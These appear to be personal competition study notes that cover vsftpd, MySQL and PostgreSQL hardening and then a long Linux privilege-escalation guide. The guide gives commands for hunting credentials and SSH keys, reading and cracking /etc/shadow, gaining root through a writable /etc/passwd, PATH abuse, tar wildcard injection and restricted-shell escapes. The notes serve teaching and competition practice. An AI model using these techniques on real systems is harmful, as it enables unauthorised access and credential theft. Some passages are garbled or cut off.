|Setting|Description|
|-------|-----------|
|listen=NO|Run from inetd or as a standalone daemon|
|listen_ipv6=YES|Listen on IPv6?|
|anonymous_enable=NO|Enable Anonymous access?|
|local_enable=YES|Allow local users to login?|
|write_enable=YES|Allows any form of an FTP write command|
|dirmessage_enable=YES|Display active directory messages when users go into certain directories?|
|use_localtime=YES|Use local time?|
|xferlog_enable=YES|Activate logging of uploads/downloads?|
|connect_from_port_20=YES|Connect from port 20?|
|secure_chroot_dir=/var/run/vsftpd/empty|Name of an empty directory|
|pam_service_name=vsftpd|This string is the name of the PAM service vsftpd will use|
|rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem|The last three options specify the location of the RSA certificate to use for SSL encrypted connections.
|rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key||	
|ssl_enable=NO||	

</center>

Before starting the service, the `vsftpd.conf` file should be properly configured. For the NCAE competition, the following configurations should be:
```bash
anonymous_enable=NO
local_enable=YES
write_enable=YES
chroot_local_user=YES      #restricts users to their home directory

#add the following directives to the conf file
user_sub_token=$USER          #needs to be added to the conf file
local_root=/home/$USER/ftp    #needs to be added to the conf file


userlist_enable=YES
userlist_file=/etc/vsftpd.userlist
userlist_deny=NO              #only users within the .userlist file can access the FTP service
```

Setting userlist_deny to NO is more secure because of the implicit deny feature. To add to the userlist, perform the following command after setting up an FTP user:
```bash
sudo touch /etc/vsftpd.userlist

echo "<user>" | sudo tee -a /etc/vsftpd.userlist

```

**1. Create FTP user:** There should be a unique user which the FTP server can use as a totally isolated and unprivileged user. With the chroot_local_user configuration, the defined user will be restricted to only their home directory. 
```bash
sudo adduser ftp_client

```

**2. Set up FTP user's directory:** Start by setting up an FTP directory within the new user's home path. The FTP directory serves as the chroot; this directory should not have write permissions for any group. 
```bash
sudo mkdir /home/ftp_client/ftp

sudo chown nobody:nogroup /home/ftp_client/ftp

sudo chmod a-w /home/ftp_client/ftp

```

**3. Set up a writable directory for the FTP user:** Because the chroot ftp directory is not writable, a writeable file directory needs to be created that stores accessible files (from the POV of the FTP user).
```bash
sudo mkdir /home/ftp_client/ftp/files

sudo chown ftp_client:ftp_client /home/ftp_client/ftp/files

```

> For all of the users that need FTP access, or need to be accessed through FTP, steps #3 and #4 can be repeated in the same format. 

**4. Store files in the `files` directory:** This can be done by copying or moving files to the /ftp/file directory and then changing the ownership (so that ftp_client owns the files).

**5. Check FTP server status**
```bash
systemctl status vsftpd

```

**6. Start FTP server status**
```bash
sudo systemctl start vsftpd

sudo systemctl restart vsftpd
```

#### **`MySQL Service Basics`**

Before looking at the configuration files, determine which version of MySQL is being used:
```bash
mysql --version

systemctl status mysql

```

Start the MySQL service and then attempt the initial installation. After starting MySQL and the following commands are not available, then manual configuration is required:


MariaDB is a fork of MySQL, so the initial installation is similar. If the following commands are not available, then manual configuration is required; if this is the case, configure the relevant files and then start mysql when indicated:
```bash
sudo systemctl start mysql

sudo mysql-secure-installation

sudo mariadb-secure-installation

```

With either installation, it will ask the following questions:
1. **Enter root password:** Enter a strong password; if no password is entered, anyone can connect to the MySQL server as root without a password and be granted all privileges.
2. **Switch to unix_socket authentication:** This is a plug-in that allows users to authenticate to the DB server using the same authentication system used on the server itself. 
   * If connected to the server as a root user, this will authenticate the user to the DB server as the root user. 
   * This is enabled by default when MariaDB is installed. Because this is already enabled, enter no here
3. **Change the root password:** If necessary
4. **Remove anonymous user:** yes
5. **Disallow root login remotely:** yes
6. **Remove test database and access to it:** yes
7. **Reload privilege tables:** yes

If the secure-installation command worked, then skip the manual configuration portion and go to the actual database set up.


<br>

If neither of these secure installation commands are available, manual configuration would be required:

**1. Set up configuration file:** Different files will be modified, depending whether MySQL or MariaDB is being used. Either way, the file looks the same
   * For MySQL, edit the `/etc/mysql/my.cnf` file
   * For MariaDB, edit the `/etc/mysql/mariadb.conf.d/50-server.cnf` file
```bash
user            = mysql
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
port            = 3306
basedir         = /usr
datadir         = /var/lib/mysql
tmpdir          = /tmp
lc-messages-dir = /usr/share/mysql
skip-external-locking
bind-address    = 127.0.0.1

```

**2. Set up permissions:** Ensure the MySQL/MariaDB directories and configuration files have secure permissions
```bash
sudo chown mysql:mysql /var/lib/mysql     #this is set by default anyways, but check anyways

sudo chmod 750 /var/lib/mysql             #this is set to 755 by default

sudo chown mysql:mysql /etc/mysql/my.cnf  #owned by root by default

sudo chmod 640 /etc/mysql/my.cnf          #set to 755 by default

```

**3. Start MySQL:** Once the service is started, try to log in to mysql as root, then go through the steps of adding users, granting privileges, creating databases, etc. 
```bash
sudo systemctl start mysql

sudo mysql -u root -p

```

**4. Secure the root account:** Ensure that the root account has a strong password and is not remotely accessible
```sql
ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_strong_password';
UPDATE mysql.user SET Host='localhost' WHERE User='root';
FLUSH PRIVILEGES;

```

**5. Remove anonymous user:** This has to be done if the secure-installation command was not available
```sql
DELETE FROM mysql.user WHERE User='';
FLUSH PRIVILEGES;

```

**6. Remove Test DB:** This DB is not needed and opens up the attack surface
```sql
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';
FLUSH PRIVILEGES;

```

Once all of the configuration files are set up, the following commands can be done to fully set everything up. 

**1. Add users:** Once the root user is set up, additional users can be created so that root is not the only account that can access the database. Note that the user does not have to be created through the `adduser` or `useradd` command:
```bash
sudo mysql -u root -p
```
```sql
MariaDB [(none)]> CREATE USER 'new_username'@'localhost' IDENTIFIED BY 'password';     --for local access

MariaDB [(none)]> CREATE USER 'new_username'@'%' IDENTIFIED BY 'password';             --for remote access

```

**2. Alter user information**
```sql
MariaDB [(none)]> ALTER USER 'username'@'localhost' IDENTIFIED BY 'new_password';      --same for remote access user
FLUSH PRIVILEGES;

```

**3. Grant privileges to the new user:** The first command can be done to grant privileges on a specific database. The second command can be done to grant all privileges on all databases:
```sql
MariaDB [(none)]> GRANT ALL PRIVILEGES ON database_name.* TO 'new_user'@'localhost';

MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.* TO 'new_user'@'localhost';

```

If expecting a connection to the DB server via SSH, specifying localhost for local access makes more sense. If not expecting an ssh connection to the DB server, then specifying % for remote access makes the most sense. In this case, the remote user would gain access by:
```bash
mysql -u <username> -p -h <IP address to DB server>

```

Adding databases, entities, data into the entities, and querying the entities all use standard SQL; however, selecting the database to be used requires the `USE database_name;` command

#### **`PostgreSQL Service Basics`**

Before looking at the configuration files, determine which version of PostgreSQL is being used and start the service:
```bash
psql --version

systemctl status postgresql

sudo systemctl start postgresql

```
Access PostgreSQL on a local machine or remote server:
```bash
sudo -i -u postgres           #to enter postgres account locally

psql -h <postgres_server_ip> -U <user> [-d db]

postgres@hostname:~$ psql     #to access postgresql

```
Create a new user and alter password if necessary:
```sql
CREATE USER "<username>" WITH PASSWORD 'password';

ALTER USER <username> WITH PASSWORD 'new_password!';

```
To create a database, do not enter psql yet, but switch to the postgres account and run the first command. To connect directly to a known database, run the second command while on the postgres account:
```bash
createdb <database_name>

psql -d <database_name>

```
Now, to view the available databases and connect to one, the first two commands can be run. The third command shows the available schemas within the connected database. All of these commands must be executed while connected to the psql service:
```sql
\l       --lists available databases

\c <database_name>      --connects to specified databae

\dn      --lists available schemas

```
To give a user access to connect on a database and use a schema, run the following commands while connected to the psql service:
```sql
GRANT CONNECT ON DATABASE <database_name> TO "<username>";      --gives the specified user access to specified database

GRANT USAGE ON SCHEMA <schema_name> TO "<username>";            --gives the specified user access to specified schema

```
While a user may be given access to connect to a database, they may not be able to modify tables. After connecting to a database, the tables within can be determined with the first command. The last two commands grant/revoke certain privileges from the user on the specified table:
```sql
\dt

GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE <table_name> TO "<username>";

REVOKE SELECT, INSERT, UPDATE, DELETE ON TABLE <table_name> FROM username

```
After all of the correct privileges are set on psql, the configuration files should be modified to grant remote access. The files are either located in **/etc/postgresql/\<version>/main/pg_hba.conf** or **/var/lib/postgresql/\<version>/main/postgresql.conf.** Within this file, make sure to keep the local host to allow local users to access the postgresql account:
```bash
sudo vim /etc/postgresql/13.main/pg_hba.conf

host     all                  all               127.0.0.1/32       md5   #allows access to all databases with all psql accounts locally

host    <db to access>        <allowed user>    <IP_Address>/32    md5   #allows connection from the specified IP address 
                                                                         #to the specified database on specified user

```
To apply the changes, the PostgreSQL service must be reloaded:
```bash
sudo systemctl reload postgresql

```
Finally, to ensure availability, the configuration files should be backed up and sent to the backup server:
```bash
cp -R /var/lib/postgresql/<version>/main /var/lib/postgresql/<version>/main_bak
```

#### **`Enumeration`**

<a id="sysenumlinuxprivesc"></a>

##### **`System Enumeration`**

Knowing the distribution will give an idea of the types of tools that may be available. This would also identify the OS and OS version, for which there may be public exploits available:
```bash
cat /etc/os-release

```
After this is determined, it is recommended to check the current user's PATH, which is where the Linux system looks every time a command is executed for any executables to match the name of what is typed. If the PATH variable for a target user is misconfigured, it may be leveraged to escalate privileges. Also, check out all environment variables that are set for the current user; sensitive information may be disclosed:
```bash
echo $PATH

env

```
Check the Kernel version too. Once this is determined, search to see if the target is running a vulnerable Kernel which has some known public exploit. There are three main ways to do this:
```bash
cat /proc/version

cat /etc/issue

uname -a

```
Next, gather additional information about the host itself, such as the CPU type and version with the following command:
```bash
lscpu

```
Note the login shells that exist on the server:
```bash
cat /etc/shells

```
Also, check to see if any defenses are in place and enumerate any information about them. Some things to look for include:
* Exec Shield
* iptables
* AppArmor
* SELinux
* Fail2ban
* Snort
* Uncomplicated Firewall (ufw)

Oftentimes, the user will not have the privileges to enumerate the configurations of these protections but knowing what, if any, are in place, can help the attacker not waste time on certain tasks. 

Next, look at the drives and any shares on the system. First, use the **`lsblk` command to enumerate information about block devices on the system** (hard disks, USB drives, optical drives, etc.). If an additional drive or unmounted file system is discovered, sensitive files, passwords, or backups that can be leveraged to escalate privileges may be disclosed:
```bash
lsblk

```
The command **`lpstat` can be used to find information about any printers attached to the system.** If there are active or queued print jobs, an attacker may be able to gain access to some sort of sensitive information. Also check for mounted and unmounted drives. Check to see if an unmounted drive can be mounted to gain access to sensitive data. Try to find any types of credentials in `fstab` for mounted drives by grepping for common words like password, username, crdential, etc. in /etc/fstab:
```bash
cat /etc/fstab
```
Also, binaries are set with SETUID and SETGID permissions to allow a user to run a command as root without having to grant root-level access to the user. Many binaries contain functionality that can be exploited to get a root shell. 

<a id="networkenumlinuxprivesc"></a>

##### **`Network Enumeration`**

The **routing tables** can be determined through the following commands, as they show what other networks are available via which interface:
```bash
route

netstat -rn

```
In a domain environment, it is necessary to check **`/etc/resolv.conf`** if the host is configured to use internal DNS first, as it could be used as a starting point to query the Active Directory environment. Also, check the arp table with the following command to see what other hosts the target has been communicating with:
```bash
arp -a

```
It is important to view which ports are listening and running internally, so to view the machine's running services, the following commands should be executed:
```bash
ip route

ip neigh          #view arp tables to see what other machines the current machine is communicating with

netstat -tua      #shows service names instead of ports

netstat -tuna     #shows port numbers instead of service names

ps -aux           #shows what user is running what command

```
More so, it is important to know which services are running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation:
```bash
ps aux | grep root
```

<a id="userenumlinuxprivesc"></a>

##### **`User Enumeration`**

To view the sudo permissions for the signed-in user, the following command can be done. Depending on the actual permissions of the user, the sudo password may or may not be required. If the password is not required and the output says `NOPASSWD` next to certain commands, the signed-in user can execute those commands without having to enter the password for sudo privileges:
```bash
sudo -l

```
The environment enumeration also includes knowledge about the users that exist on the target system. This is because individual users are often configured during the installation of applications and services to limit the service's privileges. The reason for this is to maintain the security of the system itself. If a service is running with the highest privileges (root) and this is brought under control by an attacker, the attacker automatically has the highest rights over the entire system. All users on the system are stored in the `/etc/passwd` file. Occasionally, password hashes will be stored directly in this file. If the `/etc/shadow` file is readable, the user hashes can be cracked with john or hashcat. 
* With Linux, several different hash algorithms can be used to make the passwords unrecognizable. identifying them from the first hash blocks can help the attacker use and work with them later if needed:
   * **`Salted MD5`:** \$1$
   * **`SHA-256`:** \$5$
   * **`SHA-512`:** \$6$
   * **`BCrypt`:** \$2a$
   * **`Scrypt`:** \$7$
   * **`Argon2`:** \$argon2i$

Check which users have login shells. Once it is determine which shells are on the system, check each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a shellshock exploit:
```bash
grep "*sh$" /etc/passwd

cat /etc/passwd | cut -f1 -d:

cat /etc/passwd | grep '/bin/bash' | cut -d':' -f1    #only shows users running bash

cat /etc/passwd | grep '/bin/zsh' | cut -d':' -f1     #only shows users running zsh

cat /etc/passwd | grep -v '/nologin' | grep -v '/bin/false'    #shows potentially accessible users
```
> By default, only the owner of the file (root) and its group (root) can write to /etc/password, but if it is writeable for "others," then change the UID and GUID of the logged-in user to 0 to get root privileges. While most users run either bash or zsh, all users should be enumerated


Each user in Linux systems is assigned to a specific group or groups and thus receives special privileges; for example, if there is a folder named `dev_only` for developers, a user must be assigned to the appropriate group to access that folder. The information about the available groups can be found in the `/etc/group` file, which shows the attacker both the group name and the assigned user names:
```bash
cat /etc/group

id <user>

groups <user>

```
The `getent` command can be used to list members of any interesting groups, including the *sudo* group
```bash
getent group sudo

```
Finally, it is important to see which users have a folder under the `/home` directory. Enumerate each of these to see if any of the system users are storing any sensitive data or files containing passwords:
```bash
ls /home
```

<a id="wfileetdirenumlinuxprivesc"></a>

##### **`File and Directory Enumeration`**

Look through configuration files and other files that may contain sensitive information. It is worth searching through all files that end in extensions such as `.conf` and `.config` for usernames, passwords, and other secrets. If passwords have been gathered, try them for all users present on the system because password re-use is so common. 

In Linux, there are many different places where such files can be stored, including mounted file systems. A mounted file system is a file system that is attached to a particular directory on the system and accessed through that directory. many file systems, such as ext4, NTFS, and FAT32 can be mounted. Each type of file system has its own benefits and drawbacks
* Some file systems can only be read by the OS, while others can be read and written by the user
   * File systems that can be read and written to by the user are called **read/write** file systems
* Mounting a file system allows the user to access the files and folders stored on that file system
   * In order to mount a file system, the user must have root privileges. Once a file is mounted, it can be unmounted by the user with root privileges
```bash
df -h

```
When a file system is unmounted, it is no longer accessible by the system. This can be for many reasons, like when a disk is removed, or a file system is no longer needed. Another reason may be that files, scripts, documents, and other important information must not be mounted and viewed by a standard user; therefore, if the attacker can extend their privileges to the root user, they could mount and read these files themselves. Unmounted file systems can be viewed as follows:
```bash
cat /etc/fstab | grep -v "#" | column -t

```

Many folders and files are kept hidden on a Linux system so they are not obvious and accidental editing is preventing; however, these hidden files and directories may need to be located because they often contain sensitive information, even if there is only read-only permissions:
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null    #writeable files

find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <keyword>   #hidden files

find / -type d -name ".*" -ls 2>/dev/null     #hidden directories

find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null    #writeable directories

```
There are three default folders intended for temporary files. These folders are visible to all users and can be read. In addition, temporary logs or script output can be found there. Both `/tmp` and `/var/tmp` are used to store data temporarily; however, the key difference is how long the data is stored in these file systems
* The data retention time for /var/tmp is much longer than that of the /tmp directory. 
   * By default, all files and data stored in /var/tmp are retained for up to 30 days
   * In /tmp, the data is automatically deleted after 10 days 

In addition, all temporary files stored in the /tmp directory are deleted immediately when the system is restarted; therefore, the /var/tmp directory is used by programs to store data that must be kept between reboots temporarily:
```bash
ls -l /tmp /var/tmp /dev/shm

```
**Cron jobs** are essentially scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can be leveraged to escalate privileges when the scheduled cron job runs. If a writeable directory where a cron job places files is discovered, privileges may be escalated if the script that the cron job runs is also writeable:
```bash
ls -la /etc/cron.daily/

```
The **proc filesystem** (proc/procfs) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically generated by the kernel. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduing, and memory allocation:
```bash
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

```
Users can read almost all **configuration files** on a Linux OS if the administrator has kept them the same. These configuration files can often reveal how the service is set up and configured. In addition, these files can contain sensitive information, such as keys and paths to files in folders that are not viewable; however, if the file has read permissions for everyone, anyone can read it even if there is no read permission to the folder. The following command determines the file path of all readable configuration files:
```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

```
Similar to configuration files, **scripts** may have poor privileges that allow any user to read, write, and sometimes execute them. The following command looks for all scripts on the machine:
```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

##### **`Services & Internals Enumeration`**

This phase of enumeration looks deeper into the internals of the host OS. At this time, it is also important to gather more network information. If the system has any other interfaces, they could possibly be used to pivot into another subnet that was previously unreachable from the initial attack host. This can be done with the `ip a` command. **`Internals`** refers to the internal configuration and way of working, including integrated processes designed to accomplish specific tasks, so start with the interfaces through which the target system can communicate by typing the `ip a` command. Next, look for through the `/etc/hosts` file.

It may also be useful to check out each user's **last login** time to try to see when users typically log in to the system and how frequently. This can give an idea of how widely used the system is which can open up the potential for more misconfigurations or troublesome directories or command histories. Also, the  `w` command checks to see if anyone else is currently on the system. 
```bash
lastlog

w
```
Look through a user's **bash history,** as they may be passing passwords as an argument on the command line, working with git repos, setting up cron jobs, etc. Reviewing what the user has been doing may give insight into the intent/functionality of the server and privilege escalation paths. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into an AD environment:
```bash
ls -la /home/<user>/.bash_history

history     #for current user

```
Sometimes, **special history files are created by scripts or programs.** This can be found, amon others, in scripts that monitor certain activities of users and check for suspicious activities:
```bash
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

```
If working with a slightly older Linux system, the likelihood of finding **installed packages that may already have at least one vulnerability** increases; however, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. The following command helps detect potentially dangerous packages, as it creates a list of installed packages to work with:
```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

```
This list can be compared to the binaries from GTFO bins to see which binaries are potentially exploitable:
```bash
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

```
Sometimes, however, no direct packages are installed on the system but there are **compiled programs** in the form of binaries. These do not require installation and can be executed directly by the system itself To see more information about a specific program, like installed version, the second command can be executed:
```bash
ls -l /bin /usr/bin/ /usr/sbin/

ls /usr/bin/python* 

```
Check the version of sudo installed on the system to see if it is vulnerable to any legacy or recent exploits:
```bash
sudo -V

```
**`strace`,** which is a diagnostic tool on Linux-based OSs to track and analyze system calls and signal processing, can be used to follow the follow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the OS. In addition, strace can be used to monitor security-related activities and identify potential attack vectors, such as specific requests to remote hosts using passwords or tokens. 
```bash
strace ping -c1 <IP Address>
```

<a id="credhuntingenumlinuxprivesc"></a>

##### **`Credential Hunting`**

When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bach history file, backup (.bak) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.

The **`/var` directory typically contains the web root for whatever web server is running on the host.** The web root may contain database credentials or other types of credentials that can be leverages to further access. A common example is MySQL database credentials within WordPress configuration files:
```bash
cat /var/www/html/wp-config.php | grep 'DB_USER\|DB_PASSWORD'

```
The **spool or mail directories,** if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e., MySQL connection strings, WordPress configuration files):
```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

```
It is useful to search around the system for accessible **SSH private keys.** If a private key is located for another more privileged user, it can be used to connect back to the box with additional privileges. Sometimes SSH keys can be found to access other hosts in the environment. Search through the **`known_hosts`** file to find targets, as this file contains a list of **public keys for all hosts which the user has previously connected to.** If the permissions are poor, the following command will show the SSH keys and known_hosts file in the home directory of the user:
```bash
ls ~/.ssh

```
It is also important to look through the **`authorized_keys`** file to find the **public keys of a user.** Users/machines with the corresponding private key can connect to this machine. The following command looks throughout the file system for this:
```bash
find / -name authorized_keys 2> /dev/null

```
While the **private key** is often in user's home directory, it may not always be there, so it is imperitive to look throughout the file system for the private key. The name of the private key often depends on the encryption algorithm (ecdsa, rsa, etc) used to generate the key pair, but the syntax is the same of the corresponding public key except the .pub extension. For example, if rsa was used, the name of the private key would likely be **`id_rsa`.** To look throughout the file system for the private key, the following command can be executed:
```bash
find / -name id_rsa 2> /dev/null

```
Once the private key has been located, the correct permissions must be set. It is important to note that although a private key has been looted from a specific user's home directory, that does not necessarily mean that the private key corresponds to that user: the private key may be for a different user, even the root user. After setting the correct permissions, the user can perform passwordless authentication with the private key file:
```bash
chmod 600 id_rsa

ssh -i id_rsa <user>@<IP address>

```
It is important to look through the history to see if any passwords have been written too. This may be disclosed while looking through the `.bash_history` file of a user, but if it is not, it is worth looking for the word "password" throughout the file system:
```bash
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;     # Looks for passwords in current directory

#Try variations on the word password; both of these look throughout the entire file system. 
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null

locate password | more

locate pass | more

```
If not done already, both the `/etc/passwd` and `/etc/shadow` files should be enumerated. If `/etc/passwd` has write permissions, remove the **`x`** password placeholder between root and its ID value, then switch to the root user. On the current user, change the ID value to 0 to become a root user. 

If `/etc/shadow` has read permissions, crack the hash of the administrative users. This can be done in many ways:
```bash
unshadow [passwd file] [shadow file] > combined

john combined

#or

hashcat -m <Module of hash> [shadow hashes] [password_file_list]
```

#### **`Environment-Based Escalation`**

<a id="pathabuselinuxprivesc"></a>

##### **`Path Abuse`**

Again, **`PATH`** is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. 
* For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat /tmp/test.txt`. 

To check the contents of the PATH variable, either of the following commands can be executed:
```bash
env | grep PATH

echo $PATH

```
Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system. Essentially, if a script is created in a directory specified in the PATH, it can be run anywhere in the system. **Adding `.` to a user's PATH adds their current working directory to the list** 

For example, to modify a user's path, replace a common binary such as `ls` with a malicious script such as a reverse shell. If adding `.` to the path by issuing the command `PATH=.:$PATH` and then exporting PATH, it will be possible to run binaries located in the current working directory by just typing the name of the file
* Essentially, typing `ls` will call the malicious script named ls in the current working directory instead of the binary located at `/bin/ls`

The process looks as follows:
```bash
PATH=.:${PATH}       #adds current directory to the path
export PATH          #confirms the current directory to the path
echo $PATH           #display path to double check

touch ls             #create malicious file
echo 'echo "PATH ABUSE!!"' > ls     #PoC
chmod +x ls          #add execute permissions to file
ls                   #will echo PATH ABUSE!! when ls is typed
```

<a id="wildcardabuselinuxprivesc"></a>

##### **`Wildcard Abuse`**

A **`Wildcard Character`** can be used as a replacement for other characters and are interpreted by the shell before other actions. The following are example of wild cards:

<center>

|Character|Significance|
|---------|-----------|
|`*`| An asterisk that can match any number of characters in a file name
|`?`| Matches a single character
|`[ ]`|Enclose characters and can match any single one at the defined position
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory
|`-`|A hyphen within brackets will denote a range of characters

</center>

An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. The `--checkpoint-action` option permits an EXEC action to be executed when a checkpoint is reached (i.e., run an arbitrary OS command once the tar command executed). 
* By creating files with these names, when the wildcard is specified:
   * `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to tar as a command-line options

To see this, consider the following cron job, which is set to back up the `/home/user` directory's contents and create a compressed archive within `/home/user`. The cron job is set to run every minute, so it is a good candidate for privilege escalation:
```bash
#
#
mh dom mon dow command
*/01 * * * * cd /home/user && tar -zcf /home/user/backup.tar.gz *

```

A **`Restricted Shell`** is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system or provide a way for users to access only certain system features. Some common examples of restricted shells include the following:

|`rksh`|Restricted version of a Korn shell, which is another standard command-line interpreter. For example, administrators often use restricted shells in enterprise networks to provide a safe and controlled environment for users who may accidentally or intentionally damage the system. By limiting the user's ability to execute specific commands or access certain directories, administrators can ensure that users cannot perform actions that could harm the system or compromise the network's security. Additionally, restricted shells can give users access to only certain system features, allowing administrators to control which resources and functions are available to each user. 

Several methods can be used to escape from a restricted shell: some of these methods involve exploiting vulnerabilities in the shell itself, while others involve using creative techniques to bypass the restrictions imposed by the shell. The following are a few methods that can be used to escape from a restricted shell:

**<u>Command Injection</u>**

Imagine being in a restricted shell that allows execution of commands by passing them as arguments to the ls command. Unfortunately, the shell only allows the execution of the ls command with a specific set of arguments, such as ls -l or ls -a, but it does not allow the execution of any other commands. In this situation, command injection can be used to escape from the shell by ibjecting additional commands into the argument of the ls command. For example, the following command can be used to inject a `pwd` command into the argument of the ls command:
```bash
ls -l `pwd`

```
This command would cause the ls command to be executed with the argument `-l`, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow the execution of the pwd command to see the current working directory, even though the shell does not allow the execution of the pwd command directly

<br>

**<u>Command Substitution</u>**

Command substitution involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks `. In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell:

<br>

**<u>Command Chaining</u>**

With command chaining, multiple commands would need to be used in a single command line, separated by a shell metacharacter such as a semicolon `;` or a vertical bar `|` to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell. 
```bash
pwd; ls /
```

<br>

**<u>Environment Variables</u>**

For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. ##### **`Capabilities`**

Linux **capabilities are a security feature in the Linux OS that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.** This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional unix model of granting privileges to users and groups. However, like any security feature, capabilities can be exploited by attackers
* One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing an attacker to escalate their privileges and gain access to sensitive information or perform unauthorized actions

* Another potential vulnerability is the misuse or overuse of capabilities, which can result in processes having more privileges than they need. This can create unnecessary security risks, as an attacker could exploit those privileges to gain access to sensitive information or perform unauthorized actions

Overall, Linux capabilities can be a practical security feature, but they must be used carefully and correctly to avoid vulnerabilities and potential exploits. Setting capabilities involves using the appropriate tools and commands to assign specific capabilities to executables or programs. In Ubuntu, for example, an attacker can use the `setcap` command to set capabilities for specific executables. This command allows attackers to specify the capability they want to set and the value they want to assign. 

The following command can be used to set the `cap_net_bind_service` capability for an executable:
```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic

```
When capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the **`cap_net_bind_service`** capability is set for a binary, the binary will be able to bind to network ports, which is usually a restricted privilege.

Some capabilities, such as **`cap_sys_admin`,** which allows an executable to perform actions with administrative privileges, can be dangerous if they are not used properly. For example, an attacker could exploit them to escalate their privileges, gain access to sensitive information, or perform unauthorized actions; therefore, it is crucial to set these types of capabilities for properly sandboxed and isolated executables and avoid granting them unnecessarily

<center>

|Capability|Description|Attack Vector|
|----------|-----------|-------------|
|`cap_sys_admin`|Allows to perform actions with administrative privileges|Modify system files or change system settings|
|`cap_sys_chroot`|Allows to change the root directory for the current process|Access files and directories that would otherwise be inaccessible|
|`cap_sys_ptrace`|Allows to attach to and debug other processes|Potentially gain access to sensitive information or modify the behavior of other processes|
|`cap_sys_nice`|Allows to raise or lower the priority of processes|Potentially gain access to resources that would otherwise be restricted|
|`cap_sys_time`|Allows to modify the system clock|Potentially manipulate timestamps or cause other processes to behave in unexpected ways|
|`cap_sys_resource`|Allows to modify system resource limits|Modify the maximum number of open file descriptors or the maximum amount of memory that can be allocated|
|`cap_sys_module`|Allows to load and unload kernel modules|Potentially modify the OS's behavior or gain access to sensitive information|
|`cap_net_bind_service`|Allows to bind to network ports|Potentially gain access to sensitive informaiton or perform unauthorized actions|

</center>

When a binary is executed with capabilities, it can perform the actions that the capabilities allow; however, it will not be able to perform any actions not allowed by the capabilities. This allows for more fine-grained control over the binary's privileges and can help prevent security vulnerabilities and unauthorized access to sensitive informaiton. 
* When using the setcap command to set capabilities for an executable in Linux, specify the capability that is to be set and the value that is to be assigned. The values used depend on the specific capability being set and the privileges needed to grant to the executable

The following are some examples of values that can be used with the setcap command:

<center>

|Capability Values|Description|
|-----------------|-----------|
|`=`|Sets the specified capability for the executable but does not grant any privileges. This can be usefil to clear a previously set capability for the executable|
|`+ep`|Grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability|
|`+ei`|Grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions|

This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. Several Linux capabilities can be used to escalate a user's privileges to root, including:
* **`cap_setuid`:** Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user

